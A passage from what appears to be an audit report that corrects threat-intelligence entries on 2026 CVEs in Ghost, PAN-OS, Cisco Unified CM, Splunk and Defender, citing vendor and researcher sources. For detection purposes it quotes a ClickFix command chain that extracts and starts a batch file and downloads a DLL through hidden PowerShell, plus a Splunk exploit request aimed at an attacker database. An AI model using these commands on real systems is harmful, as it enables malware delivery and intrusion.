   - Ground truth: GitHub release v6.19.1 published 2026-02-16T16:54:09Z; GHSA published 2026-02-16; SentinelOne page published/modified 2026-02-20 with only generic detection guidance. (https://github.com/TryGhost/Ghost/releases/tag/v6.19.1)
   - Fix: Say 'fixed in 6.19.1 on 2026-02-16' and drop or re-source the SentinelOne exploitation-by-27-Feb claim.
2. **[imprecision] Kill chain, user execution bullet**
   - Claim: **User execution — [`T1204.002`] User Execution: Malicious File, chained to T1059.001 PowerShell / T1059.003 Windows Command Shell.**
   - Defect: ClickFix (user pastes a command) maps to T1204.004 Malicious Copy and Paste, active in ATT&CK v20; the user never opens a malicious file (update.zip is downloaded silently by page script).
   - Ground truth: ATT&CK dataset: T1204.004 'Malicious Copy and Paste' active; XLab: 'sets a function that will execute with a delay of at least 500 milliseconds ... to secretly download malicious files in the background ... update.zip'. (https://blog.xlab.qianxin.com/ghost-cms-mass-compromised-via-cve-2026-26980-now-fueling-clickfix-attacks/)
   - Fix: Replace T1204.002 with T1204.004 and record it in techniques[].
3. **[imprecision] Kill chain, payload delivery bullet**
   - Claim: The pasted command pulls follow-on payloads
   - Defect: The pasted command does not download: the lure page silently downloads update.zip; the command moves it, extracts it with tar and starts update.bat, and update.bat's hidden PowerShell downloads the DLL that rundll32 then runs (exported function Begin).
   - Ground truth: XLab: pasted command 'move %USERPROFILE%\Downloads\update.zip %TEMP%\u.zip && tar -xf %TEMP%\u.zip -C %TEMP% && start /min "" %TEMP%\update.bat'; update.bat 'powershell -W 1 -C ... iwr ... Start-Process rundll32 -ArgumentList $f,'Begin' -Window Hidden'. (https://blog.xlab.qianxin.com/ghost-cms-mass-compromised-via-cve-2026-26980-now-fueling-clickfix-attacks/)
   - Fix: Describe the observed chain (cmd /c move + tar + start of a batch file from %TEMP%, hidden PowerShell download, hidden rundll32 calling an exported function) and use it as the detection anchor instead of generic mshta/certutil cradles.
4. **[imprecision] Detection concepts (client-side) and Hardening (Ghost)**
   - Claim: Sysmon Event ID 1 / Windows 4688 for cmd.exe or powershell.exe (especially with -EncodedCommand, clipboard-paste context, mshta, curl/certutil download cradles) ... restrict the public Content API to trusted origins
   - Defect: The hunt list names behaviors XLab did not observe (-EncodedCommand, mshta, certutil) and omits those it did (tar -xf into %TEMP%, start /min of update.bat, powershell -W 1 iwr, hidden rundll32 with an exported entry point); the Ghost mitigation repeats 'restrict the Content API', which the vendor says does not mitigate.
   - Ground truth: GHSA: 'There is no application-level workaround. The Content API key is public by design, so restricting key access does not mitigate this vulnerability.' (https://github.com/advisories/GHSA-w52v-v783-gw97)
   - Fix: Align detection with the XLab-observed process chain and the vendor WAF-only mitigation.
5. **[imprecision] frontmatter**
   - Claim: evidence quote 'Background.'; techniques absent; classification absent; summary is only the Background paragraph
   - Defect: The single evidence record is the word 'Background.' (migration residue); no ATT&CK mapping in metadata despite a full kill chain in the body; no rating; the summary tells a reader nothing about the campaign.
   - Ground truth: n/a (metadata). (https://blog.xlab.qianxin.com/ghost-cms-mass-compromised-via-cve-2026-26980-now-fueling-clickfix-attacks/)
   - Fix: Fold into the survivor; add techniques T1190, T1659, T1480, T1204.004, T1059.001/.003, T1105 and a real summary.

### 2026-05-30/cve-2026-0257-pan-os-globalprotect-pre-auth-vpn-authenticati — factual-error
1. **[factual-error] body, 'Affected and patched versions'**
   - Claim: Affected: PAN-OS 10.2.x < 10.2.7-h34 (and maintenance tracks), 11.1.x < 11.1.4-h33, 11.2.x < 11.2.4-h17, 12.1.x < 12.1.4-h6. Not affected: Panorama, Cloud NGFW, Prisma SD-WAN, PA-Series managed by Panorama with no local GP config, PAN-OS < 10.2.x (EOL). ... Prisma Access 10.2 and 11.2: Palo Alto is rolling fixes; check Prisma Access status portal.
   - Defect: Wrong boundaries and carve-outs. Affected means below the fixed build of each train (12.1 below 12.1.4-h6 and 12.1.7; 11.2 below 11.2.4-h17, 11.2.7-h14, 11.2.10-h7, 11.2.12; 11.1 up to below 11.1.15; 10.2 up to below 10.2.18-h6), so a single boundary such as '11.1.x < 11.1.4-h33' clears the whole 11.1.5-11.1.14 range. Only Panorama and Cloud NGFW are stated as not impacted; Prisma Access 10.2/11.2 IS affected with named fixed builds; older unsupported PAN-OS is told to upgrade, not declared unaffected; Prisma SD-WAN and Panorama-managed carve-outs appear in no source.
   - Ground truth: PSIRT CVE record: PAN-OS affected from 12.1.0, 11.2.0, 11.1.0, 10.2.0; Prisma Access 10.2.0 <10.2.10-h36 and 11.2.0 <11.2.7-h13; 'Panorama and Cloud NGFW are not impacted by these issues'; Solution: 'All older unsupported PAN-OS versions: Upgrade to a supported fixed version.' (https://security.paloaltonetworks.com/json/CVE-2026-0257)
   - Fix: Replace with the vendor's per-train table (fixed: 12.1.4-h6/12.1.7; 11.2.4-h17/11.2.7-h14/11.2.10-h7/11.2.12; 11.1.4-h33/11.1.6-h32/11.1.7-h6/11.1.10-h25/11.1.13-h5/11.1.15; 10.2.7-h34/10.2.10-h36/10.2.13-h21/10.2.16-h7/10.2.18-h6; Prisma Access 10.2.10-h36, 11.2.7-h13) and drop the invented carve-outs.
2. **[factual-error] body, 'Exploitation pattern'**
   - Claim: The gap between the exploitation waves (18 and 21 May) and the PoC/KEV date (29 May) implies the actor possessed private pre-disclosure knowledge of the vulnerability.
   - Defect: Contradicted by the timeline: Palo Alto published the advisory and first-wave fixes on 2026-05-13, four days before the first observed exploitation (2026-05-17); exploitation preceded the PoC/KEV date but followed public disclosure, so 'pre-disclosure knowledge' is unsupported.
   - Ground truth: PSIRT timeline 'Initial publication' 2026-05-13T16:00Z; Rapid7: 'On May 13, 2026, Palo Alto Networks published a security advisory ... The earliest date for observed exploitation was May 17, 2026.' Arctic Wolf: 'first publicly disclosed by Palo Alto Networks on May 13, 2026'. (https://www.rapid7.com/blog/post/etr-rapid7-observed-exploitation-of-pan-os-globalprotect-authentication-bypass-vulnerability-cve-2026-0257/)
   - Fix: Delete the sentence or say exploitation began four days after the advisory and about twelve days before the public PoC.
3. **[factual-error] body, 'Background'**
   - Claim: Palo Alto's own security advisories (AA23-250A, AA24-075A) have repeatedly highlighted GlobalProtect as a target surface; this vulnerability is the most directly exploitable advisory in that series.
   - Defect: AA23-250A is a CISA/FBI/CNMF joint advisory on CVE-2022-47966 (Zoho) and CVE-2022-42475 (FortiOS) that does not mention Palo Alto or GlobalProtect; AA24-075A does not resolve (404). They are not Palo Alto advisories, and 'most directly exploitable' has no source.
   - Ground truth: CISA AA23-250A: 'Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475' (2023-09-07); neither Palo Alto Networks nor GlobalProtect appears on the page. https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-075a returns HTTP 404. (https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-250a)
   - Fix: Delete the sentence.
4. **[factual-error] body, 'Vulnerability mechanics' and 'Hardening / mitigation'**
   - Claim: issue signed cookies ... uses that same certificate to sign and encrypt session tokens ... (b) generate a dedicated certificate for GlobalProtect used exclusively for that service and not shared with the HTTPS management or any other feature
   - Defect: The cookie is RSA-encrypted with the certificate and decrypted with no signature check (that is the flaw); the cookie certificate must be a separate certificate used only for authentication-override cookies, not a dedicated certificate for the GlobalProtect service, so mitigation (b) as written can leave the cookie certificate shared with the portal/gateway HTTPS service and the host exploitable.
   - Ground truth: Vendor workaround: 'Generate a new certificate exclusively for authentication override cookies and store it securely. Do not reuse the portal or gateway certificate, and do not share this certificate with other features or users.' Rapid7: 'decrypted using a private key. The decrypted content is then trusted implicitly, with no signature verification of any kind occurring after decryption.' (https://security.paloaltonetworks.com/json/CVE-2026-0257)
   - Fix: Say 'use a dedicated certificate exclusively for authentication-override cookies, distinct from the portal/gateway HTTPS certificate' and drop 'signed'.
5. **[factual-error] body, 'Hardening / mitigation' (a)**
   - Claim: disable authentication override cookies entirely in the GlobalProtect gateway and portal settings (`Authentication` > `No Cookie Required on Pre-Logon Connections`)
   - Defect: Invented UI path; the vendor's instruction is to uncheck the Authentication Override options (generate and accept cookie) on the portal agent configuration and gateway client settings. The 24-hour trigger and the `show system info` / `show sslmgr-store` verification step appear in no source.
   - Ground truth: 'Disable Authentication Override: Uncheck the Authentication Override options (for generating and accepting cookies) in the GlobalProtect portal and gateway configuration.' Portal path: Network > GlobalProtect > Portals > Agent > Authentication; Gateway: Network > GlobalProtect > Gateways > Agent > Client Settings > Authentication Override. (https://security.paloaltonetworks.com/json/CVE-2026-0257)
   - Fix: Use the vendor's checkboxes and paths; delete the unsourced verification commands.
6. **[factual-error] body, 'MITRE ATT&CK mapping' and 'Exploitation pattern'**
   - Claim: Lateral movement: T1021.001 (... expected next step once inside the network segment); T1046 (Network Service Discovery — attacker-controlled GP-CLIENT enumerating accessible segments). / Both used a deliberately spoofed, easily-recognisable MAC address pattern — suggesting deliberate source-normalisation to defeat MAC-based network anomaly detection.
   - Defect: Rapid7 and Unit 42 report no lateral movement or post-access behaviour; GP-CLIENT enumeration and RDP are invented. The MAC-evasion purpose is the entry's own speculation (the same MAC and a Windows 10 Pro client string are hard-coded in the public PoC per Unit 42). Forged cookies map to T1606.001 / T1550.004 rather than T1539 (theft); T1036.005 for a machine name is unsupported.
   - Ground truth: Rapid7: 'we did not observe any indication of successful lateral movement from the devices'; Unit 42: 'No post-access behavior or lateral movement has been identified as of this time'; 'search ... matching the following hard-coded client configuration values from the PoC code'. (https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/)
   - Fix: Map only T1190/T1133 and T1606.001 (forged auth-override cookie); delete T1021.001, T1046, T1036.005 and the evasion-intent sentence.
7. **[imprecision] body, 'Vulnerability mechanics'**
   - Claim: shares an X.509 certificate with another co-hosted service — most commonly the HTTPS management or captive-portal service ... a configuration that has historically been documented in Palo Alto's own deployment guides as a shortcut for certificate management
   - Defect: Rapid7 names the portal/gateway HTTPS service as the example; 'management or captive-portal service', 'most commonly' and the claim about Palo Alto deployment guides have no source; also the 'only pre-condition' sentence omits that authentication override cookies must be enabled, which is not a default.
   - Ground truth: Rapid7: 'reused the certificate for encrypting and decrypting cookies with another feature, such as the HTTPS service of the portal or gateway'; 'This is not a feature that is enabled by default.' PSIRT: 'applies ... when authentication override cookies are enabled and a specific certificate configuration exists.' (https://www.rapid7.com/blog/post/etr-rapid7-observed-exploitation-of-pan-os-globalprotect-authentication-bypass-vulnerability-cve-2026-0257/)
   - Fix: Restate the two preconditions (override cookies enabled; cookie certificate reused for the portal/gateway HTTPS service) and drop the deployment-guide claim.
8. **[imprecision] body, 'Detection'**
   - Claim: PAN-OS system logs: `globalprotectgateway-config-succ` events authenticated via cookie from non-enrolled endpoints (no prior SCEP or Panorama device-cert association).
   - Defect: No fetched source names this log event or the SCEP/device-cert discriminator; what the sources do give are cookie logins to the local admin account (generic or default hostnames) and POSTs to /ssl-vpn/getconfig.esp and /ssl-vpn/hipreport.esp for sessions that were established.
   - Ground truth: Rapid7: 'suspicious cookie authentication to the local admin account'; 'POST requests to /ssl-vpn/hipreport.esp and /ssl-vpn/getconfig.esp in the cases where a VPN tunnel was successfully established'. (https://www.rapid7.com/blog/post/etr-rapid7-observed-exploitation-of-pan-os-globalprotect-authentication-bypass-vulnerability-cve-2026-0257/)
   - Fix: Anchor detection on cookie-method gateway-auth logins to the local admin account from hosting-provider IPs with generic client names, then the two ESP requests.
9. **[imprecision] body, 'Exploitation pattern' and state**
   - Claim: Wave 1 (18 May) ... Rapid7 observed successful VPN session establishment but no confirmed lateral movement
   - Defect: Rapid7's earliest observed exploitation is 2026-05-17 (18 May is the alert time of the log shown). The entry is also stale today: Arctic Wolf reports a larger wave from 2026-05-30 with Impacket-style SMB/NTLM activity after tunnel establishment, and CISA's KEV now flags the CVE as used in ransomware campaigns (Arctic Wolf attributes June intrusions to Qilin); none of this is in the entry (it lives in the twin entry).
   - Ground truth: Rapid7: 'The earliest date for observed exploitation was May 17, 2026.' Arctic Wolf (2026-06-11): 'increase ... began on May 30, 2026 ... follow-on Impacket activity soon after VPN tunnel establishment'. KEV: knownRansomwareCampaignUse 'Known'. (https://arcticwolf.com/resources/blog/arctic-wolf-observes-increase-in-palo-alto-networks-globalprotect-authentication-bypass-exploitation-via-cve-2026-0257/)
   - Fix: Fold into the survivor carrying the later exploitation and ransomware facts.
10. **[imprecision] frontmatter**
   - Claim: priority: notable; summary 'Background...'; evidence quote 'Background.'; classification absent; techniques: []; affected_products: []; cves[].affected/fixed null
   - Defect: Migrated deep dive with a placeholder summary and evidence, no rating, no ATT&CK ids in metadata, no structured versions; priority notable while the twin entry for the same CVE is high with KEV ransomware flag.
   - Ground truth: KEV record CVE-2026-0257: dateAdded 2026-05-29, dueDate 2026-06-01, knownRansomwareCampaignUse 'Known'. (https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json)
   - Fix: Fold into the survivor.

### 2026-06-04/cve-2026-20230-cisco-unified-communications-manager-unauthen — factual-error
1. **[factual-error] summary**
   - Claim: Two critical advisories hit public-sector infrastructure defenders run themselves: an unauthenticated SSRF-to-root in Cisco Unified CM (CVE-2026-20230) and an OTP-bypass in MISP (CVE-2026-10611) — the threat-intel platform deployed across EU/CH national CERTs.
   - Defect: The MISP half of the summary is carried by no source, body paragraph or cves[] record of this entry (frontmatter overstates the body); 'deployed across EU/CH national CERTs' is unsourced. NVD: the MISP bypass needs LDAP mixed authentication plus enforced OTP and a valid primary credential.
   - Ground truth: NVD CVE-2026-10611 (published 2026-06-02): 'In deployments configured with LdapAuth.mixedAuth=true and Security.require_otp=true ... an attacker with valid primary authentication credentials could bypass the required OTP step'; CVSS 3.1 10.0 (nvd@nist.gov), CVSS 4.0 8.2. (https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-10611)
   - Fix: Drop the MISP clause from this entry's summary (it is a different finding) or give it its own entry with a primary source.
2. **[factual-error] body para 1**
   - Claim: coerce the device into fetching an attacker URL and writing the response to arbitrary OS locations — a write primitive Cisco states 'could be used later to elevate to root' via a drop into cron/service directories
   - Defect: Cisco says only that the attacker can 'write files to the underlying operating system'; fetching an attacker URL and the cron/service-directory drop are not in the advisory. The discoverer's write-up shows a different chain (unauthenticated cmplatform endpoint /installClusterStatusExecute used to deploy an Axis service and then a JSP web shell after learning the true hostname from /webdialer/Version.jws).
   - Ground truth: Cisco: 'A successful exploit could allow the attacker to write files to the underlying operating system that could be used later to elevate to root.' SSD: 'Once the attacker has this information he can send a request to the /cmplatform/installClusterStatusExecute and ask it to install an additional node, instead of using a valid hostname, the attacker can send a full path ...' (https://ssd-disclosure.com/cisco-unified-communications-manager-arbitrary-file-write-to-rce/)
   - Fix: Quote Cisco's wording; if mechanism is wanted, cite SSD (which was published 2026-06-23, after this entry).
3. **[imprecision] body para 1**
   - Claim: Cisco reports no confirmed in-the-wild exploitation at disclosure but states that proof-of-concept exploit code is publicly available
   - Defect: Cisco's wording is 'aware that proof-of-concept exploit code is available' (not 'publicly'); BleepingComputer says the discoverer shared no technical details at the time and published its write-up and PoC on 2026-06-23. The statement is also stale: Cisco's advisory v1.1 (2026-07-01) records active exploitation since June 2026 and CISA added the CVE to KEV on 2026-06-25, neither of which the entry carries (cves[].status poc-public, patch-available only).
   - Ground truth: Cisco: 'The Cisco PSIRT is aware that proof-of-concept exploit code is available ... In June 2026, the Cisco PSIRT became aware of active exploitation of this vulnerability.' (v1.1, 2026-JUL-01). KEV: dateAdded 2026-06-25, dueDate 2026-06-28. (https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cucm-ssrf-cXPnHcW)
   - Fix: Fold into the survivor entry carrying the exploitation and KEV state; say 'PoC available per Cisco'.
4. **[imprecision] frontmatter**
   - Claim: classification absent; techniques: []; affected_products: []; cves[].affected/fixed null; sources: Cisco only
   - Defect: No Admiralty rating or ATT&CK mapping (T1190, T1068); no structured affected (Release 14 and 15 with WebDialer enabled) or fixed (14SU6; 15SU5 or COP).
   - Ground truth: Cisco: 'Cisco Unified CM and Unified CM SME Release First Fixed Release 14 14SU6 15 15SU5 (Sep 2026) or COP'. (https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cucm-ssrf-cXPnHcW)
   - Fix: Populate on the survivor.

### 2026-06-24/cve-2026-20230-cisco-unified-cm-webdialer-ssrf-to-arbitrary — imprecision
1. **[imprecision] body para 1 (disable instruction)**
   - Claim: disable WebDialer if unused (Service Parameters → Cisco WebDialer Web Service)
   - Defect: Wrong console path: Cisco's mitigation is Cisco Unified Serviceability > Tools > Service Activation > uncheck Cisco WebDialer Web Service (Service Parameters is a different page).
   - Ground truth: 'From the Navigation menu, choose Cisco Unified Serviceability and click Go. From the Tools menu, choose Service Activation. In the CTI Services section of the page, uncheck the Cisco WebDialer Web Service check box and click Save.' (https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cucm-ssrf-cXPnHcW)
   - Fix: Use Cisco's Service Activation path.
2. **[imprecision] body para 1**
   - Claim: Defused observed exploitation over the weekend of ~2026-06-21/22 from a single source IP ... a vulnerability-fingerprinting pattern that historically precedes a targeted exploitation wave.
   - Defect: BleepingComputer (Tuesday 2026-06-23) says 'over the weekend', i.e. 2026-06-20/21; 'historically precedes a targeted exploitation wave' is not in the source (BC only says more actors will likely follow now that details are public).
   - Ground truth: BleepingComputer: 'Defused says the attacks are originating from a single IP address and use properly constructed file:// payloads ... While the current exploitation appears to be reconnaissance in nature, now that the flaw has been fully disclosed, we will likely see more threat actors target these servers.' (https://www.bleepingcomputer.com/news/security/cisco-unified-cm-sme-flaw-cve-2026-20230-now-exploited-in-attacks/)
   - Fix: Say 'over the weekend of 2026-06-20/21' and delete 'historically'.
3. **[imprecision] body (state today)**
   - Claim: Not KEV-listed as of this run. / actions: hunt WebDialer logs for file:// URIs
   - Defect: KEV added the CVE on 2026-06-25 (one day later) and Cisco confirmed active exploitation in advisory v1.1 (2026-07-01); the hunt omits the SSD-documented precursor (unauthenticated GET /webdialer/Version.jws?wsdl to learn the true hostname, then /cmplatform/installClusterStatusExecute) that SSD says is required before the write.
   - Ground truth: KEV: dateAdded 2026-06-25. Cisco v1.1: 'In June 2026, the Cisco PSIRT became aware of active exploitation'. SSD: 'The flow of the attack requires the attacker to first gain ... the hostname ... via https://<host>/webdialer/Version.jws?wsdl'. (https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json)
   - Fix: Add cisa-kev status and the two request anchors on the survivor.
4. **[imprecision] frontmatter**
   - Claim: classification absent; techniques: []; sectors: [technology]
   - Defect: No Admiralty rating; no techniques[] even though the body names T1190 and T1068; no structured affected/fixed.
   - Ground truth: Cisco fixed releases: 14SU6; 15SU5 (Sep 2026) or COP. (https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cucm-ssrf-cXPnHcW)
   - Fix: Populate on the survivor.

### 2026-06-14/cve-2026-20253-splunk-enterprise-unauthenticated-pre-auth-rc — factual-error
1. **[factual-error] body, 'CVE Summary Table' row for CVE-2026-20253**
   - Claim: | CVE-2026-20253 | Splunk Enterprise 10.0.x / 10.2.x | 9.8 | n/a | No | PoC/analysis public; no ITW reported | 10.4.0 / 10.2.4 / 10.0.7 |
   - Defect: Superseded and never revised: Splunk's advisory records limited exploitation (2026-06-18) and CISA added the CVE to KEV on 2026-06-18, so 'KEV No' and 'no ITW reported' are false; the entry's own update section, frontmatter (exploited, cisa-kev) and actions say the opposite.
   - Ground truth: Splunk SVD-2026-0603 changelog: '2026-06-18: Added: In June 2026, the Splunk Product Security Incident Response Team (PSIRT) became aware of limited exploitation of this vulnerability.' KEV: dateAdded 2026-06-18, dueDate 2026-06-21. (https://advisory.splunk.com/advisories/SVD-2026-0603)
   - Fix: Set the row to KEV Yes (2026-06-18) / limited exploitation per Splunk, or delete the table (it also carries two unrelated CVEs and brief-section residue '§ 0, § 2, § 4, § 5, § 7').
2. **[factual-error] ## Update — 2026-06-20T05:12:19Z, para 2**
   - Claim: fixed in Splunk Enterprise 10.4.0 / 10.2.4 / 10.0.7, available since 2026-06-14
   - Defect: The fixed releases were published with the advisory on 2026-06-10, not 2026-06-14.
   - Ground truth: Splunk SVD-2026-0603: 'Published: 2026-06-10 ... Upgrade Splunk Enterprise to versions 10.4.0, 10.2.4 and 10.0.7'; SecurityWeek: 'Splunk announced the availability of patches on June 10.' (https://advisory.splunk.com/advisories/SVD-2026-0603)
   - Fix: Say 'available since 2026-06-10'.
3. **[imprecision] actions[0]**
   - Claim: Pre-auth RCE via the default-enabled PostgreSQL sidecar proxy; ... Hunt `/en-US/splunkd/__raw/v1/postgres/` requests with empty Basic-auth from non-loopback sources.
   - Defect: The sidecar is default-enabled only on Splunk Enterprise on AWS; on-prem it is not installed or not enabled by default. The public PoC uses Basic credentials with a username and empty password (test:, postgres_admin:), so 'empty Basic-auth' misses them; the request path is the stable anchor. actions[1]'s 'restrict search-job submission' has no link to a pre-auth proxy flaw.
   - Ground truth: watchTowr: 'Splunk Enterprise on AWS - PostgreSQL Sidecar Service is installed and enabled by default'; 'Authorization: Basic dGVzdDo=' / 'Basic cG9zdGdyZXNfYWRtaW46'. Splunk workaround: '[postgres] disabled = true' in $SPLUNK_HOME/etc/system/local/server.conf (unless Edge Processor, OpAmp or SPL2 pipelines are used). (https://labs.watchtowr.com/why-use-app-level-auth-when-every-database-has-auth-splunk-enterprise-cve-2026-20253-pre-auth-rce/)
   - Fix: Say 'default-enabled on Splunk on AWS; check on-prem'; hunt on the /postgres/recovery/ paths regardless of auth header; name Splunk's disable-sidecar workaround and its Edge Processor/OpAmp/SPL2 caveat.
4. **[imprecision] CVE Summary Table row CVE-2026-10795**
   - Claim: | CVE-2026-10795 | UpdraftPlus WordPress plugin ≤ 1.26.4 | 8.1 | n/a | No | Not confirmed ITW; mechanism public, Wordfence preventive rules | 1.26.5 | [WPScan]
   - Defect: The cited WPScan page carries only the CVE, CVSS 8.1 and 'Fixed in 1.26.5'; the exploitation and Wordfence-rule statements are on no cited page. Wordfence scores the same flaw 9.8 and today reports 27,239 blocked attacks in 24 hours.
   - Ground truth: WPScan: 'Fixed in 1.26.5', CVSS 8.1 (high), 'Publicly Published 2026-06-10'. Wordfence: 'CVSS 9.8 (Critical)'; 'Wordfence blocked 27,239 attacks targeting this vulnerability in the past 24 hours.' (https://www.wordfence.com/threat-intel/vulnerabilities/id/e901c2a0-2477-4b9a-8483-6002419e0a2f)
   - Fix: Drop the unrelated rows (they are not this finding) or re-source them.
5. **[imprecision] Update section, para 1**
   - Claim: Splunk PSIRT and NCSC-NL have confirmed that CVE-2026-20253 ... is now under limited targeted exploitation in the wild
   - Defect: NCSC-NL is not cited; its advisory NCSC-2026-0198 v1.0.1 (2026-06-19) only relays Splunk PSIRT's observation and adds 'as far as is known code execution is not possible', which conflicts with watchTowr's RCE chain and is not surfaced as a contradiction. 'Splunk is a standard SIEM platform inside CH/EU public-sector SOC environments' is unsourced.
   - Ground truth: NCSC-NL: 'Het Splunk PSIRT meldt dat beperkt en gericht misbruik is waargenomen ... Voor zover bekend is uitvoer van code niet mogelijk.' (https://advisories.ncsc.nl/2026/ncsc-2026-0198.html)
   - Fix: Cite NCSC-NL as a relay of Splunk and add a Contradiction line on code execution.
6. **[imprecision] frontmatter**
   - Claim: classification: null; techniques: []; affected_products: []; cves[].affected/fixed null; evidence: the entry's own migrated update text
   - Defect: No Admiralty rating, no ATT&CK ids (T1190, T1059 in the twin's body), no structured versions.
   - Ground truth: Splunk Product Status: 10.4 not affected (fix 10.4.0); 10.2.0 to 10.2.3 (fix 10.2.4); 10.0.0 to 10.0.6 (fix 10.0.7); 9.4 and 9.3 not affected; Splunk Cloud not affected. (https://advisory.splunk.com/advisories/SVD-2026-0603)
   - Fix: Populate on the survivor.

### 2026-06-14/splunk-enterprise-cve-2026-20253-pre-auth-rce-in-the-siem-vi — imprecision
1. **[imprecision] body ('Hardening and remediation' last sentence) and frontmatter status**
   - Claim: There is no reported in-the-wild exploitation at the time of writing
   - Defect: True on 2026-06-14 but never updated: Splunk recorded limited exploitation on 2026-06-18 and CISA added the CVE to KEV the same day; the entry still carries status poc-public / patch-available only. NCSC-NL's advisory adds 'as far as is known code execution is not possible', conflicting with watchTowr's RCE chain.
   - Ground truth: Splunk SVD-2026-0603 changelog '2026-06-18: ... became aware of limited exploitation'; KEV dateAdded 2026-06-18. (https://advisory.splunk.com/advisories/SVD-2026-0603)
   - Fix: Fold into the survivor (the sibling entry carries the exploited/KEV state).
2. **[imprecision] body, 'The mechanism' and 'Hunt and detection concepts'**
   - Claim: an external client can reach the no-auth database API by sending empty Basic credentials. From there an attacker writes attacker-controlled files into the sidecar's runtime directory and injects SQL into a crafted backup/restore payload ... requests carrying empty or anonymous Basic-auth credentials
   - Defect: Omits the observed chain's prerequisite and primitive: /backup connects Splunk out to an attacker-controlled PostgreSQL server (hostaddr=...) and dumps it to a traversal path, /restore replays the dump with an injected passfile, an lo_export function writes a file, and a Splunk-run Python script is overwritten; so egress from the Splunk host to an attacker database is a detection anchor. Later PoC requests use Basic with usernames (test:, postgres_admin:) and an empty password.
   - Ground truth: watchTowr: '{"database":"hostaddr=attacker.db.watchTowr.local","backupFile":"/tmp/poc"}'; 'Authorization: Basic cG9zdGdyZXNfYWRtaW46'; overwrite of /opt/splunk/etc/apps/splunk_secure_gateway/bin/ssg_enable_modular_input.py. (https://labs.watchtowr.com/why-use-app-level-auth-when-every-database-has-auth-splunk-enterprise-cve-2026-20253-pre-auth-rce/)
   - Fix: Describe the dump-from-attacker-DB then restore chain and add outbound PostgreSQL connections from the Splunk host as a signal.
3. **[imprecision] frontmatter**
   - Claim: summary: 'The uncomfortable angle on this one is ...'; evidence: []; classification absent; techniques []; priority notable (twin: high)
   - Defect: Summary has no finding content; no rating or techniques[] although T1190/T1059 are named in the body.
   - Ground truth: n/a (metadata). (https://labs.watchtowr.com/why-use-app-level-auth-when-every-database-has-auth-splunk-enterprise-cve-2026-20253-pre-auth-rce/)
   - Fix: Fold into the survivor.

### 2026-06-19/nightmare-chaotic-eclipse-zero-day-wave-the-defender-lpe-now — factual-error
1. **[factual-error] headline, summary, actions[0], cves[].status, tags**
   - Claim: ...the Defender LPE now carries a CVE, a public PoC, and Microsoft's "Exploitation More Likely" rating, with no patch / No patch exists / status: [poc-public, no-patch]
   - Defect: True on 2026-06-19, false today and never updated in this entry: Microsoft released the fix on 2026-07-08 (engine 1.1.26060.3008), so 'no patch' in the headline, summary, action and status is a stale statement; the fix, and its later bypass CVE-2026-69414 (fixed in engine 1.1.26080.3 on 2026-09-03), live only in the sibling entries.
   - Ground truth: MSRC CVE-2026-50656 revision 2 (2026-07-08): 'Microsoft has released an update to the Microsoft Malware Protection Engine that addresses the vulnerability identified by CVE-2026-50656.' Last affected engine 1.1.26050.11, first fixed 1.1.26060.3008. (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-50656)
   - Fix: Fold into the survivor, carry the fix state, and drop the compensating-control action.
2. **[factual-error] summary**
   - Claim: ESET detailed GentleKiller, an operator-maintained EDR-killer framework run centrally by the Gentlemen RaaS gang — eight BYOVD driver variants against 400+ security processes across 48 product families, with confirmed Western-European targeting (ESET, 2026-06-18).
   - Defect: A different finding: nothing in this entry's body, sources or cves[] covers GentleKiller, so the summary (frontmatter) claims something its cited sources (MSRC, Help Net Security, The Hacker News) do not support; the 'confirmed Western-European targeting' detail is not checkable from any cited page.
   - Ground truth: Cited sources concern CVE-2026-50656 only (MSRC 'Microsoft Defender Elevation of Privilege Vulnerability'; HNS 'Microsoft working on patch for RoguePlanet Defender zero-day'). (https://www.helpnetsecurity.com/2026/06/17/rogueplanet-zero-day-cve-2026-50656/)
   - Fix: Delete the GentleKiller sentence from this entry's summary (it needs its own entry and an ESET citation).
3. **[imprecision] body para 2 and actions[0]**
   - Claim: The exploit abuses a TOCTOU race: during a scan Defender resolves a file path and later reopens it for analysis, and the PoC swaps in a malicious file in that window ... monitor for `MsMpEng.exe` spawning `cmd.exe`/`powershell.exe` as SYSTEM ... and constrain which low-privilege accounts can trigger on-demand scans
   - Defect: The mechanism sentence is uncited and appears in neither cited source (they say 'race condition' and CWE-59 link following; analysts describe NTFS junctions, oplocks and the WER QueueReporting task); the MsMpEng-parent detection and the 'constrain on-demand scans' control are unsourced inventions (for the follow-on ShieldBreak chain LevelBlue shows wermgr.exe, not the engine, executing the payload).
   - Ground truth: THN: 'The exploit is a race condition, so it's a hit or miss.' Cyber Kendra: 'attack chain built on NTFS junctions, opportunistic locks, and the Windows Error Reporting QueueReporting scheduled task'. (https://thehackernews.com/2026/06/microsoft-confirms-rogueplanet-defender_02022423645.html)
   - Fix: Cite or drop the mechanism; replace the action with the patch/engine-version check.
4. **[imprecision] frontmatter**
   - Claim: classification absent; techniques: []; affected null/fixed null; evidence: []; priority: high
   - Defect: No Admiralty rating, no ATT&CK ids (T1068), no structured engine versions; priority high no longer reflects a patched, locally exploitable, not-exploited flaw (MSRC exploited: No).
   - Ground truth: MSRC: Important, exploited 'No', 'Exploitation More Likely'; KEV has no entry for CVE-2026-50656 (catalogue of 2026-10-16). (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-50656)
   - Fix: Resolve on the survivor.

### 2026-07-09/ncsc-ch-rogueplanet-cve-2026-50656-defender-lpe-fixed — imprecision
1. **[imprecision] body para 2 and summary**
   - Claim: Because the Malware Protection Engine (`mpengine.dll`) auto-updates multiple times a day by default, most estates will already carry the fixed build / The engine auto-updates
   - Defect: MSRC says the engine is typically released once a month or as needed; it is the malware definitions that update three times daily. The engine only 'may search for engine and definition updates ... up to multiple times daily'.
